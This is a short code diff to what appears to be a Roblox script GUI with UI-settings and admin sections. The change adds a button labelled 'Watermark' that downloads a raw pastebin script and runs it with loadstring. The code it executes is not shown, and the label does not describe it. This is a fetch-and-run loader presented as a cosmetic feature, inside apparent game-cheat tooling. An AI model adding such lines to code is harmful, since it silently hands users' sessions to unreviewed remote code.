@@ -69,6 +69,9 @@ local Section = Tab:NewSection("UI Settings")
 Section:NewKeybind("ToggleUI", "ToggleUI", Enum.KeyCode.V, function()
 	Library:ToggleUI()
 end)
+Section:NewButton("Watermark", "Watermark", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Ucb8H2i8", true))()
+end)
 
 local Section = Tab:NewSection("Admin")
 
